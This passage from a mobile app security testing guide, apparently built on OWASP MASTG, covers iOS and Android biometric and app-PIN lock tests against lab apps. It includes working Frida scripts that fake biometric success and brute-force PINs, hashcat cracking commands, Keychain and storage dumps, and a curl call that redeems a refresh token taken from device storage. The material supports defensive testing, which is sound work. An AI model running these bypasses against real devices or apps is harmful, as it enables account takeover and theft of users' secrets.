   plutil -p ipa/Payload/App.app/Info.plist | grep -E 'CFBundleExecutable|NSFaceIDUsageDescription'
   otool -L ipa/Payload/App.app/App | grep -E 'LocalAuthentication|Security.framework'
   ls ipa/Payload/App.app/Frameworks/ ipa/Payload/App.app/PlugIns/ 2>/dev/null
   ```

   `NSFaceIDUsageDescription` and a link to `LocalAuthentication.framework` say the app uses `LAContext`; `Security.framework` alone says nothing (every app uses it).

2. **Find `evaluatePolicy` and the Keychain access-control API in every binary.**

   ```bash
   for b in ipa/Payload/App.app/App ipa/Payload/App.app/Frameworks/*.framework/*; do
     [ -f "$b" ] && file "$b" | grep -q Mach-O || continue
     echo "== $b"
     rabin2 -zz "$b" | grep -oE 'evaluatePolicy:localizedReason:reply:|evaluateAccessControl:operation:localizedReason:reply:|setCredential:type:' | sort -u
     rabin2 -i "$b" | grep -oE 'SecAccessControlCreateWithFlags|SecItemCopyMatching|SecItemAdd|SecKeyCreateRandomKey|SecKeyCreateSignature' | sort -u
   done
   ```

3. **Locate the call sites with r2.** The OWASP demo's r2 script does this; in essence:

   ```bash
   r2 -q -e scr.color=false -c 'aaa; f~evaluatePolicy' ipa/Payload/App.app/App
   # take the reloc.fixup.evaluatePolicy:localizedReason: address from the output, then:
   r2 -q -e scr.color=false -c 'aaa; axt @ 0x100010098' ipa/Payload/App.app/App
   r2 -q -e scr.color=false -c 'aaa; pdf @ 0x100004344' ipa/Payload/App.app/App | grep -C 5 'evaluatePolicy:'
   r2 -q -e scr.color=false -c 'aaa; axt @ sym.imp.SecAccessControlCreateWithFlags' ipa/Payload/App.app/App
   ```

   At an `objc_msgSend` with the `evaluatePolicy:localizedReason:` selector, register `w2` holds the policy: `1` is `.deviceOwnerAuthenticationWithBiometrics`, `2` is `.deviceOwnerAuthentication`. At a `SecAccessControlCreateWithFlags` call, `w2`/`x2` holds the flags; decode them with the table in our [MASWE-0016 note](/mobile/maswe-0016-key-access-not-restricted/#ios-access-control-flags-mastg-know-0056-mastg-know-0057) (`0x1` user presence, `0x2` any biometry, `0x8` current biometry set, `0x10` device passcode, `0x40000000` private-key usage — **not** a user-presence flag, `0x80000000` application password).

4. **Relate the calls to the resources.** For each function that calls `evaluatePolicy`, read what happens in the reply closure (in Swift it is a separate closure function; r2's `axt` on the closure symbol or a decompiler such as Ghidra helps): does it call `SecItemCopyMatching` for an item created with an access-control object, or does it read `UserDefaults`, a file or an in-memory property and continue? Cross-reference the `SecItemAdd` that stores each sensitive item and check whether its attribute dictionary includes `kSecAttrAccessControl`.

#### Observation

The locations of `LAContext.evaluatePolicy` (with policy) and of `SecAccessControlCreateWithFlags` (with decoded flags), or their absence, and for each sensitive resource the path by which the app obtains it after authentication.

#### Evaluation

Following OWASP, the test **fails** for each sensitive resource if:

- `LAContext.evaluatePolicy` is used explicitly to gate it; and
- there are no calls to `SecAccessControlCreateWithFlags` requiring user presence with any of the user-presence flags (`.userPresence`, `.biometryAny`, `.biometryCurrentSet`, `.devicePasscode`, optionally combined with `.applicationPassword`).

Read "no calls" per resource, not per binary: one correctly protected item does not cover a token stored elsewhere without access control. And `.privateKeyUsage` on its own does not count — it permits Secure Enclave operations without any user presence.

The test **passes** if each sensitive resource is released by the Keychain (or a Secure Enclave key) only under a user-presence access control. An `evaluatePolicy` call that precedes such a Keychain read — to pre-authenticate a context passed in `kSecUseAuthenticationContext`, or to show the prompt at a moment the UX prefers — is fine. An `evaluatePolicy` gate over non-sensitive content (blurring the home screen) is informational.

#### Demo

OWASP's [MASTG-DEMO-0041](https://mas.owasp.org/MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0041/MASTG-DEMO-0041/) shows the pattern in its plainest form:

```swift
let token = "8767086b9f6f976g-a8df76"
let context = LAContext()
context.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics,
                       localizedReason: "Authenticate to access your token") { success, error in
    DispatchQueue.main.async {
        if success {
            completion("✅ Retrieved token: \(token)")   // the token is just a value in the app
            return
        }
        completion("❌ \(error?.localizedDescription ?? "failed")")
    }
}
```

The r2 script's output:

```text
Print xrefs to 'evaluatePolicy"
0x100008297 38 str.evaluatePolicy:localizedReason:reply:
0x100010098 8 reloc.fixup.evaluatePolicy:localizedReason:

Print xrefs to 0x100010098
sym.MASTestApp.MastgTest.mastg.completion.nd_n 0x100004344 [DATA:r--] ldr x1, [x8, 0x98]

Print disassembly around "evaluatePolicy" in the function
│           0x100004344      ldr x1, [x8, 0x98]     ; reloc.fixup.evaluatePolicy:localizedReason: ; char *selector
│           0x100004348      mov x0, x19            ; void *instance
│           0x10000434c      mov w2, 1
│           0x100004350      mov x3, x20
│           0x100004354      mov x4, x22
│           0x100004358      bl sym.imp.objc_msgSend
Print xrefs to 'SecAccessControlCreateWithFlags"
```

The Swift call became `objc_msgSend(context, "evaluatePolicy:localizedReason:reply:", 1, reason, block)`: `w2 = 1` is `LAPolicyDeviceOwnerAuthenticationWithBiometrics`, `x3` the reason string, `x4` the reply block. The search for `SecAccessControlCreateWithFlags` prints nothing — the binary never creates a Keychain access control. The test fails. (OWASP's companion demo [MASTG-DEMO-0047](https://mas.owasp.org/MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0047/MASTG-DEMO-0047/), for a token stored in the Keychain without user presence, is still a placeholder at the time of writing.)

### MASTG-TEST-0267: Runtime Use Of Event-Bound Biometric Authentication (iOS)

Source: [MASTG-TEST-0267](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0267/). Platform: iOS. Type: dynamic (hooks). Knowledge: [Local Authentication Framework](#ios-local-authentication-framework-mastg-know-0056).

#### Overview

The dynamic counterpart of MASTG-TEST-0266. Hook `-[LAContext evaluatePolicy:localizedReason:reply:]` and `SecAccessControlCreateWithFlags`, exercise the app, and see which flows authenticate the user with a Boolean and which create Keychain items that require user presence. Runtime observation catches what static analysis misses: code in frameworks and plugins, Swift that is hard to read in disassembly, and flags computed at runtime. We extend the OWASP test with the step that turns the observation into a demonstrated finding: the bypass itself.

#### Prerequisites

- A jailbroken device with `frida-server`, or a non-jailbroken device with the app repackaged with Frida Gadget and re-signed ([MASTG-TECH-0146](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0146/)).
- The app installed ([MASTG-TECH-0056](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0056/)), for example with `ideviceinstaller -i app.ipa`, or `xcrun devicectl device install app --device <UDID> App.app` for a development build.
- [Frida](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0039/) for method hooking ([MASTG-TECH-0095](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0095/)) and [objection](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0038/). Face ID or Touch ID enrolled on the device, so the real prompt can appear.

#### Steps

1. **Hook the APIs.** This script combines the two OWASP demo scripts ([MASTG-DEMO-0042](https://mas.owasp.org/MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0042/MASTG-DEMO-0042/) for `evaluatePolicy` and MASTG-DEMO-0044 for `SecAccessControlCreateWithFlags`), adds the result of each evaluation by wrapping the reply block, and logs Keychain reads with their status. Set `FORCE_SUCCESS` to `true` to turn it into a bypass.

   ```javascript
   // gt-la-trace.js (Frida 17; on Frida 16 use Module.findExportByName(null, name))
   const FORCE_SUCCESS = false;
   const POLICIES = { 1: 'deviceOwnerAuthenticationWithBiometrics', 2: 'deviceOwnerAuthentication' };
   const FLAGS = [[0x1, 'userPresence'], [0x2, 'biometryAny'], [0x8, 'biometryCurrentSet'],
     [0x10, 'devicePasscode'], [0x20, 'watch'], [0x4000, 'or'], [0x8000, 'and'],
     [0x40000000, 'privateKeyUsage'], [0x80000000, 'applicationPassword']];
   const decode = (v) => FLAGS.filter(([b]) => ((v & b) >>> 0) === b).map(([, n]) => n).join('|') || 'none';
   const bt = (ctx) => Thread.backtrace(ctx, Backtracer.ACCURATE).slice(0, 5)
     .map(DebugSymbol.fromAddress).join('\n    ');

   Interceptor.attach(ObjC.classes.LAContext['- evaluatePolicy:localizedReason:reply:'].implementation, {
     onEnter(args) {
       const policy = args[2].toInt32();
       console.log('\n[LAContext evaluatePolicy] policy=' + policy + ' (' + (POLICIES[policy] || '?') + ') reason="' +
         new ObjC.Object(args[3]) + '"\n    ' + bt(this.context));
       const block = new ObjC.Block(args[4]);
       const original = block.implementation;
       block.implementation = function (success, error) {
         console.log('[LAContext evaluatePolicy] reply success=' + success +
           (error.isNull() ? '' : ' error=' + new ObjC.Object(error).code()));
         if (FORCE_SUCCESS && !success) {
           console.log('[!] forcing success=true');
           return original(true, NULL);
         }
         return original(success, error);
       };
     }
   });

   Interceptor.attach(Module.getGlobalExportByName('SecAccessControlCreateWithFlags'), {
     onEnter(args) {
       const flags = args[2].toUInt32();
       console.log('\n[SecAccessControlCreateWithFlags] protection=' + new ObjC.Object(args[1]) +
         ' flags=0x' + flags.toString(16) + ' (' + decode(flags) + ')\n    ' + bt(this.context));
     }
   });

   Interceptor.attach(Module.getGlobalExportByName('SecItemCopyMatching'), {
     onEnter(args) {
       const q = new ObjC.Object(args[0]);
       this.label = 'svce=' + q.objectForKey_('svce') + ' acct=' + q.objectForKey_('acct') +
         ' authContext=' + (q.objectForKey_('u_AuthCtx') !== null);
     },
     onLeave(ret) {
       console.log('[SecItemCopyMatching] ' + this.label + ' -> status ' + ret.toInt32());
     }
   });
   ```

   `u_AuthCtx` is the raw string value of `kSecUseAuthenticationContext`; if you prefer not to rely on it, read the constant with `new ObjC.Object(Module.getGlobalExportByName('kSecUseAuthenticationContext').readPointer())`.

   ```bash
   frida -U -f com.example.app -l gt-la-trace.js -o la-trace.log
   ```

2. **Exercise the app extensively.** Log in, enable Face ID login, relaunch, unlock with Face ID, trigger every operation from your sensitive list, cancel a prompt, fail a biometric (use an unenrolled finger or cover the camera). Note which UI action produced which log lines.

3. **Attempt the bypass.** Either restart with `FORCE_SUCCESS = true`, or use objection, which does the same:

   ```bash
   objection -n com.example.app start
   # in the objection REPL:
   ios ui biometrics_bypass
   ```

   Trigger the protected operation and fail or cancel the biometric. If the app proceeds, record what it shows or sends.

4. **Show what the bypass yields.** A bypassed screen is the start of the evidence, not the end. Dump the Keychain (`ios keychain dump`, [MASTG-TECH-0061](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0061/)) and `UserDefaults` (`ios nsuserdefaults get`) to show the secret behind the prompt is readable without authentication, or run the non-interactive Keychain probe from our [MASWE-0016 GT-0016-6 test](/mobile/maswe-0016-key-access-not-restricted/#gt-0016-6-using-keychain-items-and-secure-enclave-keys-without-authentication-ios).

#### Observation

The log of `evaluatePolicy` calls (policy, reason, caller, result) and `SecAccessControlCreateWithFlags` calls (protection class, decoded flags, caller); the Keychain reads with status codes; and for step 3 and 4, the app's behaviour under the forced result and the redacted secrets obtained.

#### Evaluation

Following OWASP, the test **fails** for each sensitive resource if `LAContext.evaluatePolicy` is used explicitly and there are no calls to `SecAccessControlCreateWithFlags` requiring user presence for that resource. Our bypass step sharpens this:

- **Fail, demonstrated:** with the reply forced to `true` the app releases the protected screen, data or operation; or the secret is readable from the Keychain or storage without any prompt.
- **Pass:** the forced reply has no effect on sensitive resources because they come from `SecItemCopyMatching` on user-presence items — under the bypass you see the system prompt appear again (a second sheet from the Keychain) or `SecItemCopyMatching` returning `-128`, `-25293` or `-25308` — and the app does not continue without the data.

#### Demo

For the [MASTG-DEMO-0041](#mastg-test-0266-references-to-apis-for-event-bound-biometric-authentication-ios) sample, OWASP's demo hook prints:

```text
LAContext.canEvaluatePolicy(0x1) called with .deviceOwnerAuthenticationWithBiometrics (0x1)

Backtrace:
0x10095c35c MASTestApp!specialized static MastgTest.mastgTest(completion:)
0x10095d4b4 MASTestApp!closure #1 in closure #1 in closure #1 in ContentView.body.getter
0x19fc721a8 SwiftUI!ButtonAction.callAsFunction()
```

(The demo script's log message says `canEvaluatePolicy`, but it is attached to `evaluatePolicy:localizedReason:reply:`.) No `SecAccessControlCreateWithFlags` line appears while the app runs. objection's bypass, run against the same flow, produces output like this — format as documented in the objection wiki and the legacy MASTG v1 test [MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064/):

```text
org.owasp.mastestapp.MASTestApp-iOS on (iPhone: 17.5) [usb] # ios ui biometrics_bypass
(agent) Registering job 7kx2m1qv9ab. Type: ios-biometrics-disable
(agent) [7kx2m1qv9ab] Localized Reason for auth requirement: Authenticate to access your token
(agent) [7kx2m1qv9ab] OS authentication response: false
(agent) [7kx2m1qv9ab] Marking OS response as True instead
(agent) [7kx2m1qv9ab] Biometrics bypass hook complete
```

The app shows "✅ Retrieved token: 8767086b9f6f976g-a8df76" after a cancelled Face ID prompt. The test fails with a demonstrated bypass ([MASTG-TECH-0135](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0135/) describes the same technique).

### GT-0020-1: Runtime bypass of BiometricPrompt (Android)

Guler Tech methodology. Platform: Android. Type: dynamic (hooks). Complements [MASTG-TEST-0327](#mastg-test-0327-references-to-apis-for-event-bound-biometric-authentication-android) and [MASTG-TEST-0330](#mastg-test-0330-references-to-apis-for-keys-used-in-biometric-authentication-with-extended-validity-duration-android); OWASP has a dynamic iOS test (MASTG-TEST-0267) but no Android equivalent among the current tests.

#### Overview

Fake a successful biometric authentication and observe what the app does. The script below intercepts the framework `BiometricPrompt.authenticate` — which Jetpack `androidx.biometric` also calls on Android 9 and later — suppresses the real prompt, and invokes the app's callback with a success result. For event-bound prompts it passes no `CryptoObject`; for crypto-bound prompts it passes back the app's own, unauthorised `CryptoObject`. The Keystore then decides: a key that requires per-operation authentication refuses, anything else works. The test turns the static findings into evidence and measures validity windows from the app's point of view.

#### Prerequisites

- A rooted device or an emulator with `frida-server` ([MASTG-TECH-0043](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0043/)), Android 9 or later. On an emulator, enrol a fingerprint in Settings and use `adb -e emu finger touch 1` to authenticate for real when you need a baseline; the emulator's Keystore is software-backed but enforces authentication requirements, which is all this test needs.
- A secure lock screen and at least one enrolled Class 3 biometric (otherwise auth-bound keys cannot be created).
- A test account, and the results of MASTG-TEST-0327 so you know which prompts protect what.

#### Steps

1. **Baseline.** Use each protected feature once with a genuine biometric. Note the screens, the network requests (proxy) and, for crypto-bound flows, which key aliases are used.

2. **Reconnaissance with objection (optional).** Find wrappers and see which callbacks fire:

   ```bash
   objection -n com.example.app start        # older objection releases: objection -g com.example.app explore
   # in the REPL:
   android hooking search classes Biometric
   android hooking watch class androidx.biometric.BiometricPrompt$AuthenticationCallback
   ```

   Watching the abstract callback class shows nothing if the app's subclass overrides the methods; watch the app's own callback class (from jadx) instead.

3. **Load the bypass.**

   ```javascript
   // gt-biometric-bypass.js
   Java.perform(function () {
     const BP = Java.use('android.hardware.biometrics.BiometricPrompt');
     const Result = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
     const Runnable = Java.use('java.lang.Runnable');
     const Cipher = Java.use('javax.crypto.Cipher');
     const Signature = Java.use('java.security.Signature');
     let n = 0;

     function makeResult(crypto) {
       try { return Result.$new(crypto, 2); }   // API 30+: (CryptoObject, AUTHENTICATION_RESULT_TYPE_BIOMETRIC)
       catch (e) { return Result.$new(crypto); } // API 28-29: (CryptoObject)
     }

     function fireSuccess(executor, callback, crypto) {
       const Fire = Java.registerClass({
         name: 'gt.FireSuccess' + (n++),
         implements: [Runnable],
         methods: {
           run: function () {
             console.log('[*] calling onAuthenticationSucceeded(crypto=' + crypto + ')');
             try { callback.onAuthenticationSucceeded(makeResult(crypto)); }
             catch (e) { console.log('[+] app threw inside the callback: ' + e); }
           }
         }
       });
       executor.execute(Fire.$new());
     }

     BP.authenticate.overload('android.os.CancellationSignal', 'java.util.concurrent.Executor',
         'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback')
       .implementation = function (cancel, executor, callback) {
         console.log('\n[!] authenticate() WITHOUT CryptoObject - prompt suppressed');
         fireSuccess(executor, callback, null);
       };

     BP.authenticate.overload('android.hardware.biometrics.BiometricPrompt$CryptoObject',
         'android.os.CancellationSignal', 'java.util.concurrent.Executor',
         'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback')
       .implementation = function (crypto, cancel, executor, callback) {
         console.log('\n[*] authenticate() WITH CryptoObject - prompt suppressed, passing the unauthorised object back');
         fireSuccess(executor, callback, crypto);
       };

     // Log what the Keystore says when the app uses the crypto object
     Cipher.doFinal.overload('[B').implementation = function (input) {
       try { const out = this.doFinal(input); console.log('[Cipher.doFinal] ok, ' + out.length + ' bytes'); return out; }
       catch (e) { console.log('[Cipher.doFinal] threw ' + e); throw e; }
     };
     Signature.sign.overload().implementation = function () {
       try { const out = this.sign(); console.log('[Signature.sign] ok, ' + out.length + ' bytes'); return out; }
       catch (e) { console.log('[Signature.sign] threw ' + e); throw e; }
     };
   });
   ```

   ```bash
   frida -U -f com.example.app -l gt-biometric-bypass.js -o bypass.log
   # or, inside an objection session:  import gt-biometric-bypass.js
   ```

   If the app uses other `doFinal` overloads (`doFinal()`, `doFinal(byte[], int, int)`), add them in the same way. On API 28–29, Jetpack may route device-credential prompts through `KeyguardManager` instead; the equivalent bypass there is to force `onActivityResult(requestCode, -1 /* RESULT_OK */, data)`.

4. **Trigger every protected feature** and let the hook fire. For each, record what the app does: shows the protected screen, displays or uses a secret, sends a request (check the proxy), or shows an error.

5. **Measure validity windows.** For flows backed by time-bound keys (MASTG-TEST-0330), run step 4 twice: right after unlocking the device with the PIN, and again after waiting longer than the configured timeout with the screen on. A flow that works in the first run and fails with `UserNotAuthenticatedException` in the second confirms that a device unlock is all the key needs.

6. **Check for swallowed exceptions.** Where `doFinal`/`sign` threw, check whether the app nevertheless continued — navigated to the protected screen, enabled the operation, or sent the request without the crypto output. That is the "exception handling" bypass.

7. **Show the impact.** For a bypass, capture the protected screen, the redacted secret, or the request the app sent with it. If the request was accepted by the server, continue with [GT-0020-3](#gt-0020-3-server-side-enforcement-of-local-authentication-android-and-ios).

#### Observation

For each protected feature: the overload used (with or without `CryptoObject`), the result of `doFinal`/`sign` under the fake success, the app's behaviour, and for time-bound keys the behaviour inside and outside the window. Keep the Frida log, screenshots and proxy history.

#### Evaluation

The test **fails** for a sensitive feature if, with no genuine authentication:

- the app grants access to the protected screen, data or operation (event-bound prompt, or a `CryptoObject` over a key without authentication);
- `doFinal`/`sign` succeeds outside a deliberate, short validity window, or succeeds within a window that is longer than the operation justifies;
- `doFinal`/`sign` throws but the app proceeds anyway.

It **passes** if every sensitive feature stops with the Keystore's `IllegalBlockSizeException` (per-operation key) or `UserNotAuthenticatedException` (time-bound key outside its window) and the app shows an error or the real prompt again without granting access.

#### Demo

Against the OWASP [MASTG-DEMO-0090](https://mas.owasp.org/MASTG/demos/android/MASVS-AUTH/MASTG-DEMO-0090/MASTG-DEMO-0090/) sample on an emulator (Android 14), with no fingerprint touched:

```text
[!] authenticate() WITHOUT CryptoObject - prompt suppressed
[*] calling onAuthenticationSucceeded(crypto=null)

[*] authenticate() WITH CryptoObject - prompt suppressed, passing the unauthorised object back
[*] calling onAuthenticationSucceeded(crypto=android.hardware.biometrics.BiometricPrompt$CryptoObject@3c1e2a7)
[Cipher.doFinal] ok, 40 bytes

[*] authenticate() WITH CryptoObject - prompt suppressed, passing the unauthorised object back
[*] calling onAuthenticationSucceeded(crypto=android.hardware.biometrics.BiometricPrompt$CryptoObject@9a04f15)
[Cipher.doFinal] ok, 24 bytes
```

The app displays the token from scenario 1 and "Decrypted Secret Token: …" from scenario 2b: the event-bound prompt and the `CryptoObject` over a non-auth key are both bypassed. (40 bytes is the 24-byte token plus the 16-byte GCM tag.) After changing the sample's key to `setUserAuthenticationRequired(true)` with `setUserAuthenticationParameters(0, KeyProperties.AUTH_BIOMETRIC_STRONG)`, the same run ends with:

```text
[*] calling onAuthenticationSucceeded(crypto=android.hardware.biometrics.BiometricPrompt$CryptoObject@5be0c02)
[Cipher.doFinal] threw javax.crypto.IllegalBlockSizeException
```

and the sample's own `catch` block reports "Test 2a: Encryption failed"; nothing is encrypted, so there is nothing to decrypt. The cause in logcat is `android.security.KeyStoreException: Key user not authenticated`. That is the pass condition, and it is what a crypto-bound design buys: the hook still fires, the callback still runs, and it gets nothing.

### GT-0020-2: App PIN and passcode lock screens (Android and iOS)

Guler Tech methodology. Platforms: Android and iOS. Type: static, filesystem and dynamic. Knowledge: [app PINs, app locks and remember me](#both-platforms-app-pins-app-locks-and-remember-me).

#### Overview

Test an app-defined PIN, pattern or passcode lock — the screen that asks for "your 6-digit app PIN" at launch, after a background timeout, or before a payment — against the five questions in the Knowledge section: where the PIN is verified, what verifier is stored, where attempts are counted, how the unlocked state is represented, and what the lock actually protects. The aim is to find the cheapest bypass and show its result: an edited flag, a PIN recovered offline, an attempt counter reset, or a token taken from storage without touching the lock at all.

#### Prerequisites

- Android: a rooted device or emulator with `frida-server`, jadx output, `sqlite3`, and `hashcat` (or Python) on your workstation. iOS: a jailbroken device with `frida-server` and SSH, or the app repackaged with Frida Gadget (file access is then limited to what the app itself can do).
- objection, a proxy ([MASTG-TECH-0011](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0011/) / [MASTG-TECH-0063](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0063/)) and a test account on which you have set a known PIN. Agree with the client before testing server-side PIN attempt limits; they can lock the test account.

#### Steps

1. **Find the implementation.**

   ```bash
   # Android (jadx output)
   grep -rniE 'pin(code|hash|_hash|Attempts|_attempts)|passcode|app_?lock|lockscreen|failed_?attempts|isLocked|unlock' out/sources/ \
     | grep -vE '^out/sources/(androidx|com/google|kotlin)/' | head -100
   grep -rnE 'MessageDigest\.getInstance|PBKDF2|SecretKeyFactory|Argon2|BCrypt' out/sources/ | grep -vE '^out/sources/androidx/'

   # iOS (decrypted binary)
   rabin2 -zz ipa/Payload/App.app/App | grep -iE 'pin|passcode|applock|attempt|locked' | head -100
   rabin2 -i ipa/Payload/App.app/App | grep -E 'CC_SHA256|CC_SHA1|CC_MD5|CCKeyDerivationPBKDF|setCredential'
   ```

   Read the verification method. Note string comparisons of the input with a stored or hardcoded value, the hash or KDF used, salts and iteration counts, and any master or debug PIN.

2. **Determine where the PIN is verified.** Enter a wrong PIN and a correct one with the proxy running. No request means local verification. A request means server verification: note the endpoint and what is sent (the PIN in clear over TLS is acceptable for a server check; a hash of the PIN computed on the client is no better than the PIN itself, because it is a replayable PIN-equivalent).

3. **Collect what is stored.** Set a known PIN in the app, then pull its storage.

   ```bash
   # Android
   adb shell su -c 'ls -la /data/data/com.example.app/shared_prefs/ /data/data/com.example.app/databases/ /data/data/com.example.app/files/'
   adb shell su -c 'cat /data/data/com.example.app/shared_prefs/*.xml'
   adb shell su -c 'cp /data/data/com.example.app/databases/app.db /data/local/tmp/ && chmod 644 /data/local/tmp/app.db'
   adb pull /data/local/tmp/app.db && sqlite3 app.db '.tables'
   ```

   ```bash
   # iOS (jailbroken, in the objection REPL)
   ios nsuserdefaults get
   ios keychain dump --json keychain.json
   env                                    # shows the app's Library and Documents paths
   ```

   Look for the verifier (`pin`, `pin_hash`, `passcode`), salts, attempt counters, lockout timestamps, lock flags (`app_lock_enabled`, `is_unlocked`, `last_unlock_at`, `background_ts`) and — most importantly — the secrets the lock is meant to protect: access and refresh tokens, the database key, the user's PII.

4. **Recover the PIN offline.** If a verifier is stored in a form you can copy, run an exhaustive search. For an unsalted SHA-256 of a four- to six-digit PIN:

   ```bash
   echo 'a388f562e286fdf28986f9253579f4d096446e01dd0c771996a51ff11b390fa2' > pin.hash
   hashcat -m 1400 -a 3 --increment --increment-min 4 pin.hash '?d?d?d?d?d?d'
   ```

   Other common formats: `-m 1410` for `sha256($pass.$salt)` and `-m 1420` for `sha256($salt.$pass)` (hash file lines `hash:salt`); `-m 10900` for PBKDF2-HMAC-SHA256 (`sha256:<iterations>:<base64 salt>:<base64 hash>`). For anything custom, a few lines of Python are quicker than finding the right mode:

   ```bash
   python3 -c 'import hashlib,sys; t=sys.argv[1]; print([p for p in (f"{i:04d}" for i in range(10000)) if hashlib.sha256(p.encode()).hexdigest()==t])' \
     a388f562e286fdf28986f9253579f4d096446e01dd0c771996a51ff11b390fa2
   ```

   If the verifier is an HMAC or ciphertext under a Keystore or Keychain key, you cannot search offline; continue with step 5, which tests the on-device rate.

5. **Test the attempt limit.** Enter wrong PINs until the app locks out or wipes, and record the limit and the consequence. Then try to reset it:

   - force-stop and relaunch (`adb shell am force-stop com.example.app`; swipe away on iOS) — an in-memory counter resets;
   - edit or delete the counter in storage (step 6 shows how);
   - if the lockout end is computed from the device clock, move the clock forward;
   - call the verification method directly, bypassing the UI counter:

   ```javascript
   // gt-pin-oracle.js - adapt class and method names from jadx
   Java.perform(function () {
     Java.choose('com.example.app.lock.PinManager', {
       onMatch: function (mgr) {
         for (let i = 0; i < 10000; i++) {
           const pin = ('000' + i).slice(-4);
           if (mgr.verifyPin(pin)) { console.log('[!] PIN found: ' + pin); break; }
         }
       },
       onComplete: function () { console.log('done'); }
     });
   });
   ```

   On iOS, the same approach uses `ObjC.choose` for Objective-C classes; for pure Swift classes, find the verification function with `DebugSymbol.findFunctionsMatching('*verifyPin*')` or r2 and call it through a `NativeFunction`, or brute-force through the UI with a hook that resets the counter after each attempt.

   For a **server-verified** PIN, the equivalent test is a rate-limit test of the endpoint (OWASP WSTG-ATHN-03, *Testing for Weak Lock Out Mechanism*): send a bounded number of wrong PINs (for example 20) with Burp Intruder and check for lockout, throttling or escalating delays, and whether the counter is per account, per device or per session (a new session or device ID that resets it is a finding).

6. **Tamper with the lock state.** With the app stopped, edit the flag and relaunch.

   ```bash
   # Android: edit in place so ownership and SELinux context are preserved
   adb shell am force-stop com.example.app
   adb shell su -c "sed -i 's/name=\"app_lock_enabled\" value=\"true\"/name=\"app_lock_enabled\" value=\"false\"/' \
     /data/data/com.example.app/shared_prefs/security_prefs.xml"
   adb shell monkey -p com.example.app -c android.intent.category.LAUNCHER 1
   ```

   ```javascript
   // iOS: set a UserDefaults flag from inside the app, then relaunch
   ObjC.classes.NSUserDefaults.standardUserDefaults().setBool_forKey_(false, 'appLockEnabled');
   ObjC.classes.NSUserDefaults.standardUserDefaults().synchronize();
   ```

   Where the state lives in memory, force it with objection instead: `android hooking set return_value com.example.app.lock.LockManager.isUnlocked true` on Android; on iOS, `ios hooking set return_value "-[LockManager isUnlocked]" true` for Objective-C methods. Also try the structural bypasses: press Back on the Android lock activity (`adb shell input keyevent KEYCODE_BACK`) to see if it simply finishes and reveals the activity underneath; start the post-unlock activity directly (`android intent launch_activity com.example.app.HomeActivity` in objection — a non-exported activity reachable from outside is MASWE-0018's subject); and send the app to the background past the re-lock timeout to check that the lock actually returns.

7. **Bypass the lock entirely.** Take the protected secret from storage (step 3) and use it from your workstation. For a refresh token:

   ```bash
   curl -s https://api.example.com/oauth/token \
     -d grant_type=refresh_token -d client_id=example-mobile -d "refresh_token=$RT"
   ```

   A new access token proves the lock protected nothing for anyone with the files. Use the token issuer's real parameters from the proxy history.

#### Observation

Where the PIN is verified; the stored verifier and its format; the PIN recovered offline (and how long it took); the attempt limit and how it was reset; the lock-state representation and the tampering that bypassed it; the secrets stored next to the lock and whether they worked from another client.

#### Evaluation

The test **fails** if any of the following holds for a lock that protects sensitive data or operations:

- the PIN, or a verifier that can be searched offline (any hash or KDF of a short numeric PIN), is stored on the device;
- a hardcoded, default or master PIN unlocks the app;
- the attempt limit is absent, or can be reset by restarting the app, editing storage, changing the clock or calling the verifier directly;
- the unlocked state is a flag or timestamp in app storage or memory that, once changed, grants access;
- the lock can be dismissed (Back, launching another activity, removing an overlay) or does not re-engage after the advertised timeout;
- the secrets the lock is meant to protect are readable without unlocking it (plaintext, or under a key that requires no authentication);
- for a server-verified PIN, the server does not limit attempts per account, or the limit resets with a new session or device identifier.

It **passes** if the PIN is verified by the server with an account-level attempt limit, or locally only as an input to key material that cannot be searched off-device and whose attempts are limited by a party the attacker cannot reset (server, or an OS-throttled factor combined with the PIN, such as iOS `.applicationPassword` with `.biometryCurrentSet`); there is no unlocked flag to flip; and session secrets are only available after the unlock decrypts them.

#### Demo

A lab app with a four-digit app PIN and "stay signed in" stores this in `/data/data/com.example.app/shared_prefs/security_prefs.xml`:

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="app_lock_enabled" value="true" />
    <string name="pin_hash">a388f562e286fdf28986f9253579f4d096446e01dd0c771996a51ff11b390fa2</string>
    <int name="pin_failed_attempts" value="0" />
    <long name="last_unlock_at" value="1793865600000" />
    <string name="refresh_token">rt_lab_6b1f0c...(redacted)</string>
</map>
```

and verifies it like this (jadx):

```java
public final boolean verifyPin(String pin) {
    String hash = HashUtil.sha256Hex(pin);
    if (Intrinsics.areEqual(hash, this.prefs.getString("pin_hash", null))) {
        this.prefs.edit().putInt("pin_failed_attempts", 0).putLong("last_unlock_at", System.currentTimeMillis()).apply();
        return true;
    }
    this.prefs.edit().putInt("pin_failed_attempts", this.prefs.getInt("pin_failed_attempts", 0) + 1).apply();
    return false;
}
```

hashcat recovers the PIN instantly:

```text
a388f562e286fdf28986f9253579f4d096446e01dd0c771996a51ff11b390fa2:4821

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
```

Every defect is present at once: an unsalted SHA-256 of a four-digit PIN; a counter and an unlock timestamp in the same writable file (setting `last_unlock_at` to the current time skips the lock until the re-lock timeout); `app_lock_enabled` can simply be set to `false`; and the refresh token next to them redeems for a new access token with `curl`, without the PIN. The test fails. In the report, lead with the token — it makes the PIN irrelevant — and list the PIN weaknesses as contributing defects.

